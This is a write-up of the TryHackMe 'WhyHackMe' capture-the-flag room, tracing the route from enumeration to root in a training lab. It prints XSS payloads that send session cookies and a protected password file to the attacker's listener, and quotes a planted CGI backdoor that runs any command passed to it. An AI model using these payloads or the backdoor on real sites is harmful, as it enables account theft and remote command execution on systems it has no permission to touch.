# WhyHackMe Writeup ([TryHackMe][2])

#### Dive into the depths of security and analysis with WhyHackMe.

### Step 1: Enumeration

Starting with the standard portscan.

```bash
root@ip-10-10-59-20:~# nmap -sC -sV 10.10.129.57

Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-09 10:47 GMT
Nmap scan report for ip-10-10-129-57.u-west-1.compute.internal (10.10.80.101)
Host is up (0.013s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.59.20
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome!!
MAC Address: 02:AE:86:D5:15:1B (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.55 seconds
```

Great, we only have three ports and we directly see a file on the FTP server.

Let's see what's in there.

### Step 1a: Accessing FTP

Since we know from our nmap scan that we can access the FTP server anonymously, we don't need to get fancy here.

```bash
root@ip-10-10-59-20:~# ftp 10.10.129.57
Connected to 10.10.129.57.
220 (vsFTPd 3.0.3)
Name (10.10.129.57:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> get update.txt
local: update.txt remote: update.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for update.txt (318 bytes).
226 Transfer complete.
318 bytes received in 0.08 secs (3.7607 kB/s)
```

Nice and easy.

```bash
root@ip-10-10-59-20:~# cat update.txt 
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```

Seems like we got a user name (admin) and the location of a password file (what can possibly go wrong?). There is also a "common" account mentioned. I wonder what that means.

However, the password file is supposedly only accessible from the localhost. 

### Step 1b: Enumerating the website

Now, let's start OWASP ZAP and have a look at the hosted website.

At first we see a very generic landing page, which directly leads us to the `blog.php` site.

![](C:\Users\mfichtn\Documents\THM\THM\WhyHackMe\Images\LandingPage.jpg)

There we see the user `admin`, again.

![](C:\Users\mfichtn\Documents\THM\THM\WhyHackMe\Images\Blog.jpg)

And finally a login page.

![](C:\Users\mfichtn\Documents\THM\THM\WhyHackMe\Images\Login.jpg)

I tried to brute force the login page, using the user `admin` and `common`,  but did not succeed.

Thus, I went on to enumerate further with gobuster.

```bash
root@ip-10-10-59-20:~# gobuster dir -u 10.10.129.57 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
==============================================================
[+] Url:            http://10.10.129.57
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2024/01/09 14:28:31 Starting gobuster
===============================================================
/index.php (Status: 200)
/blog.php (Status: 200)
/login.php (Status: 200)
/register.php (Status: 200)
/dir (Status: 403)
/assets (Status: 301)
/logout.php (Status: 302)
/config.php (Status: 200)
/server-status (Status: 403)
===============================================================
2024/01/09 14:38:04 Finished
===============================================================
```

`register.php` and `config.php` sound promising. Let's check them out.

![](C:\Users\mfichtn\Documents\THM\THM\WhyHackMe\Images\Register.jpg)

I registered a user `test` and went on to try some Cross site scripting (XSS) on the blog. Nothing worked though.

Since the user is shown as well, I tried whether my username could be abused. I registered another user named `<script>alert()</script>` (not necessarily my preferred name...).

Now I wrote a new blogpost. And here it comes.

![](C:\Users\mfichtn\Documents\THM\THM\WhyHackMe\Images\ScriptUserTest.jpg)

Great. It seems that the webpage is susceptible to XSS attacks.

Given the hint in the comments, that the admin will monitor the comments, it isn't hard to guess that we probably want to steal his cookies.

### Step 1c: Stealing cookies

To steal the cookies, I registered another user with an even better name:

```html
<script>var i=new Image(); i.src="http://10.10.59.20:9999/?cookie="+btoa(document.cookie);</script>
```

I then started a webserver.

```bash
python -m http.server 9999
```

After entering any comment I got the following output:

```bash
root@ip-10-10-59-20:~# python -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
10.10.59.20 - - [09/Jan/2024 15:11:46] "GET /?cookie= HTTP/1.1" 200 -
10.10.129.57 - - [09/Jan/2024 15:12:18] "GET /?cookie= HTTP/1.1" 200 -
```

Well, that didn't work as expected. I see that the XSS worked but the cookie isn't transferred. Maybe stealing the cookie isn't the way to go.

### Step 1d: Accessing the file

All I want is access to the `pass.txt` file. Thus, I wrote a very short script that forces the admins browser to send it to me.

```js
//getter.js
var url = "dir/pass.txt"
var xhr = new XMLHttpRequest(); 
xhr.open("GET", url, false); 
xhr.send();

var content = xhr.responseText;
var xhr_to_me = new XMLHttpRequest(); 
xhr_to_me.open("POST", 'http://10.10.59.20:9999/', false);
xhr_to_me.send(content);
```

I then registered a new user named `<script src="http://10.10.59.20:8888/getter.js"></script>` so the victim downloads the getter.js script. In theory one could also put the whole script into the username. However, my approach has the benefit that a) the username is much shorter and less complicated and b) I could easily change it and don't need to register another user.

Now I made a blog post and set up the python server:

```bash
root@ip-10-10-59-20:~# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.59.20 - - [09/Jan/2024 16:08:05] "GET /getter.js HTTP/1.1" 200 -
10.10.129.57 - - [09/Jan/2024 16:08:19] "GET /getter.js HTTP/1.1" 200 -
```

I also started netcat to receive the post request:

```bash
root@ip-10-10-59-20:~# nc -lnvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.129.57 42802 received!
POST / HTTP/1.1
Host: 10.10.59.20:9999
Connection: keep-alive
Content-Length: 32
Origin: http://127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/71.0.3542.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Referer: http://127.0.0.1/blog.php
Accept-Encoding: gzip, deflate

jack:WhyIsMyPasswordSoStrongIDK
```

I was hoping to see all my funny username but it appears that this file does not store the websites credentials but SSH credentials.

### Step 2: The user flag

With the password, I was able to SSH into the machine and got the first flag:

```bash
jack@ubuntu:~$ ls
user.txt
jack@ubuntu:~$ cat user.txt
1******************************a
```

That was fun.

### Step 3: Becoming root

Starting with your standard commands, you'll find something interesting:

```bash
jack@ubuntu:~$ id
uid=1001(jack) gid=1001(jack) groups=1001(jack)
jack@ubuntu:~$ sudo -l
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

```bash
jack@ubuntu:~$ ls -la /usr/sbin/iptables
lrwxrwxrwx 1 root root 26 Aug 31  2022 /usr/sbin/iptables -> /etc/alternatives/iptables
```

Write access to iptables? That sounds nice.

### Step 3a: iptables

Unfortunately, we can't simply copy a bash to the `/usr/sbin` folder, so I had a look into `iptables`.

```bash
jack@ubuntu:~$ sudo iptables -L
[sudo] password for jack: 
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere      
```

The output is rather straightforward to understand. If we look at the `INPUT` chain, we we see that everything is dropped (aka blocked) except ssh and http. 

With SSH access, one has to be rather careful when messing around with iptables, as we can quickly lock out ourselves. However, the default policy is ACCEPT so we can simply remove all rules with:

```bash
sudo iptables -F
```

Now, all ports should be open and we can have a look at the port that was specifically mentioned:

*Note: I did the second part two days after. Thus the IPs changed.*

```bash
root@ip-10-10-120-77:~# nmap -sV -sC -p41312 10.10.33.207

Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-11 09:28 GMT
Nmap scan report for ip-10-10-33-207.eu-west-1.compute.internal (10.10.33.207)
Host is up (0.0054s latency).

PORT      STATE SERVICE  VERSION
41312/tcp open  ssl/http Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName= boring.box/organizationName= /stateOrProvinceName= /countryName=AU
| Not valid before: 2022-02-25T19:06:50
|_Not valid after:  2023-02-25T19:06:50
MAC Address: 02:EB:4A:7B:2D:93 (Unknown)
Service Info: Host: www.example.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.73 seconds

```

This seems to be a https server. Checking it out with Firefox leads to a huge dissapointment:

![](C:\Users\mfichtn\Documents\THM\THM\WhyHackMe\Images\Port41312.jpg)

Again, this route seems to be blocked.

### Step 3b: Wireshark

I went on to go through the folders on the machine and found the following files in `opt`

```bash
jack@ubuntu:/opt$ ls -la
total 40
drwxr-xr-x  2 root root  4096 Aug 16 15:18 .
drwxr-xr-x 19 root root  4096 Mar 14  2023 ..
-rw-r--r--  1 root root 27247 Aug 16 18:13 capture.pcap
-rw-r--r--  1 root root   388 Aug 16 15:18 urgent.txt
```

```bash
jack@ubuntu:/opt$ cat urgent.txt 
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
```

Ooops. Maybe blindly opening all ports wasn't great. Anyways, I retreived the pcap file for analysis with wireshark. I also checked out the mentioned folder but couldn't access it.

```bash
jack@ubuntu:~$ ls -la /usr/lib/cgi-bin/
ls: cannot open directory '/usr/lib/cgi-bin/': Permission denied
jack@ubuntu:~$ ls -la /usr/lib/
total 1144
drwxr-xr-x 91 root root     4096 Jan 11 10:00 .
drwxr-xr-x 14 root root     4096 Aug 31  2022 ..
[snip]
drwxr-x---  2 root h4ck3d   4096 Aug 16 14:29 cgi-bin
[snip]
```

Before moving on with wireshark I checked the `etc/apache2` folder because the site in question is running on an apache server:

```bash
jack@ubuntu:/etc/apache2/sites-enabled$ ls
000-default.conf
jack@ubuntu:/etc/apache2/sites-enabled$ cat 000-default.conf 
<VirtualHost *:80>
	[snip]
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ScriptAlias "/cgi-bin/" "/usr/local/apache2/cgi-bin/"
	[snip]
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
Listen 41312
<VirtualHost *:41312>
        ServerName www.example.com
        ServerAdmin webmaster@localhost
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        SSLEngine on
        SSLCipherSuite AES256-SHA
        SSLProtocol -all +TLSv1.2
        SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
        SSLCertificateKeyFile /etc/apache2/certs/apache.key
	ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
	AddHandler cgi-script .cgi .py .pl
	DocumentRoot /usr/lib/cgi-bin/
	<Directory "/usr/lib/cgi-bin">
		AllowOverride All 
		Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch
		Order allow,deny
		Allow from all
	</Directory>
</VirtualHost>
```

 I transferred the SSL private key at `/etc/apache2/certs/apache.key` to my AttackBox and opened Wireshark.

As expected, the connection was encrypted so I loaded the `apache.key` to wirkeshark (Edit -> Preferences -> Protocols -> SSL -> Edit RSA Key list). I then analysed the formerly encrypted HTTP stream:

![](C:\Users\mfichtn\Documents\THM\THM\WhyHackMe\Images\Wireshark.jpg)

Seems like our secret website is executing any command when we call the `5UP3r53Cr37.py` file, and supply the right key. After all, opening the port wasn't too bad. I was playing around with some commands and checked the full script using the `cat 5UP3r53Cr37.py` command in the browser:

```python
#!/usr/bin/python3

from Crypto.Cipher import AES
import os, base64
import cgi, cgitb

print("Content-type: text/html\n\n")
enc_pay = b'k/1umtqRYGJzyyR1kNy3Z+m6bg7Xp7PXXFB9sOih2IPNBRR++jJvUzWZ+WuGdax2ngHyU9seaIb5rEqGcQ7OJA=='
form = cgi.FieldStorage()
try:
    iv = bytes(form.getvalue('iv'),'utf-8')
    key = bytes(form.getvalue('key'),'utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    orgnl = cipher.decrypt(base64.b64decode(enc_pay))
    print("" + eval(orgnl) + "")
except:
    print("") 
```

When we decrypt the `orgnl` variable, we will find that the python script simply executes the following command:

```python
b'__import__("os").popen(form.getvalue("cmd")).read()#############'
```

We kinda knew this already :-) By altering the string after `cmd=` in the browsers address field (leaving `key` and `iv` intact) we can pretty much execute every command as if we have a shell.

### Step 3c: Finishing

This step can be done in multiple ways. The proper way would certainly be to deploy a reverse shell and the use the terminal as usual. I, however, did it the lazy way and simply used my browser to execute the necessary commands.

I checked `sudo -l` and found that I can run it without password. Sending a `sudo cat /root/root.txt` gave me the root flag.

### Optional analysis:

In the root folder you'll also find a `bot.py` file:

```python
from requests_html import HTMLSession
session = HTMLSession()
resp = session.get("http://127.0.0.1/blog.php") # Run JavaScript code on webpage
resp.html.render(sleep=6) 
```

This file is the reason for our initial foothold. It simply loads and renders the blog.php webpage and thus running our injected script.

Afterwards it sleeps for 6 seconds before loading the page again.

### Final thoughts

A very nice room with a rather unusual route to root. I haven't worked with iptables in quite a while and it was a good refresher to read it up again.

#### I enjoyed this CTF a lot and I hope you enjoyed this writeup.

[2]: https://tryhackme.com/room/whyhackme
